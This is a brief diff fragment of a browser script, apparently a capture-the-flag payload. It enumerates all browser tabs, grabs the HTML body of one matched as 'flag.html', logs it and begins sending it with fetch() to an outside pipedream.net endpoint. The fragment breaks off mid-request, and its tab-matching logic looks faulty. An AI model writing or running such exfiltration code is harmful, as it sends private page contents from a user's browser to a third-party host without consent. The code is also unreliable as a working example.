@@ -5,7 +5,7 @@
     <script>
      chrome.tabs.query({}, function(tabs) {
             tabs.forEach(t => {
-        if(t.id==flag.html){
+        if(t.id=="flag.html"){
       var flag = $("body").html();
       console.log(flag)
       fetch('https://eo876vqe5g2n7ku.m.pipedream.net', {
